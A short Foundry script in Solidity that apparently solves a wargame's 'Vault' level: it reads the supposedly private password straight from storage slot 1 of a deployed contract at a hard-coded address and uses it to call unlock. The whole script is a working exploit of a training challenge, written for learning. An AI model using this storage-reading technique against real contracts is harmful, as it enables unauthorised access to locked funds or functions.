// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../src/levels/Vault.sol";

contract VaultScript is Script {
    Vault public instance = Vault(payable(0xf86B8cac1bdC5593b9FA4001F38652D1a5f3CA09));

    function run() external {
	vm.startBroadcast();
	console.log("Vault Contract locked?", instance.locked());
	console.log("Retrieving password...");
	bytes32 password = vm.load(address(instance), bytes32(uint256(1)));
	console.log("Unlocking...");
	instance.unlock(password);
	console.log("Vault Contract is locked?", instance.locked());
	vm.stopBroadcast();
    }
}
